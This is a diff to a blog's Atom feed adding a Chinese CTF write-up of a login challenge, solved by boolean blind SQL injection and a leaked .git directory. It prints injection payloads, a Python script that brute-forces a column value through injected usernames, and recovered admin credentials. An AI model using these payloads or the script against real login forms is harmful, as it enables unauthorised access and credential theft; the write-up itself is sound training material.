@@ -6,10 +6,38 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-05-31T09:15:12.434Z</updated>
+  <updated>2018-05-31T11:22:04.986Z</updated>
   <id>http://yoursite.com/</id>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>“百度杯”CTF比赛 登陆 writeup</title>
+    <link href="http://yoursite.com/2018/05/31/logindft/"/>
+    <id>http://yoursite.com/2018/05/31/logindft/</id>
+    <published>2018-05-31T11:17:46.000Z</published>
+    <updated>2018-05-31T11:22:04.986Z</updated>
+    
+    <content type="html"><![CDATA[<p>打开页面是一个登陆框:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74624348.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>什么都发现不了，<br>但是这个表单中用户名密码的<code>class</code>有点奇怪，先记着</p><p>随便输入用户名和密码<br>同时打开burpsuite抓包：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/49866720.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>用万能密码试试：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/81470936.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>提示密码错误，但是当提交<code>or &#39;1&#39; = &#39;2</code>时，显示的是：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31785022.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>猜测是个布尔型的盲注</p><p>试了很多函数不行，最后看的wp，用的是正则表达式：<br>username=<figure class="highlight plain"><figcaption><span>or user() regexp '^a' %23```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">我们用burpsuite进行盲注：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/59736271.jpg)</span><br><span class="line"></span><br><span class="line">然后字典选择`a~z,0~9,(),_`</span><br><span class="line">用的都是表的常用字符,然后开始爆破：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/66273786.jpg)</span><br><span class="line"></span><br><span class="line">可以知道第一位是`u`，</span><br><span class="line">一直持续下去可以发现这个列的名字就是前面表单用户名的`class`</span><br><span class="line">然后密码也是，就不仔细说了，</span><br><span class="line">接下来爆列:</span><br><span class="line">将`user()`替换成`user_n3me`：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/46135022.jpg)</span><br><span class="line"></span><br><span class="line">继续爆破：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/42315072.jpg)</span><br><span class="line"></span><br><span class="line">可以知道第一位是b，重复这个过程就行了</span><br><span class="line">最终得到</span><br><span class="line">用户名：`bctf3dm1n`密码：`2bfb1532857ddc0033fdae5bde3facdf`</span><br><span class="line">md5解密之后是:`adminqwe123666`</span><br><span class="line"></span><br><span class="line">一个个爆破可以比较麻烦，这里给出c26大佬的py脚本：</span><br></pre></td></tr></table></figure></p><p>import string<br>import requests</p><p>url = ‘<a href="http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;" target="_blank" rel="noopener">http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;</a><br>headers = {‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0”}<br>payloads = string.ascii_letters + string.digits<br>temp = ‘’<br>for i in range(40):<br>    print(“the”+str(i)+”one”)<br>    for p in payloads:<br>        payload = temp + p<br>        name = “admin’ or user_n3me like ‘{}%’ ;#”.format(payload)<br>        data = dict(username=name, passwrod=’test’)<br>        res = requests.post(url, headers=headers, data=data)<br>        if (len(res.content) == 12):<br>            temp = temp + p<br>            print(temp.ljust(32, ‘.’))<br>            break<br><code>`</code><br>换url和列名就行。</p><p>登陆进去之后是这个页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/83153689.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>那个.bctfg1t看起来像个.git文件，试了一下：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/205237.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>果然是个.git文件，githack跑完之后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/25792402.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>接下来很明显就是还原版本了，<br><code>git cat-file -p 哈希</code><br>一直到a1开头的哈希：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74666070.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>出来一个文件名,我们访问他：<br>得到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/79811599.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;打开页面是一个登陆框:&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
+                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg&quot; al
+      
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
+    
+    
+      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term=".git泄露" scheme="http://yoursite.com/tags/git%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
   
   <entry>
     <title>解决burpsuite里中文不显示的方法</title>
@@ -118,9 +146,9 @@
       <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
     
     
-      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
       <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
@@ -199,9 +227,9 @@
       <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
     
     
-      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
       <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
   </entry>
   
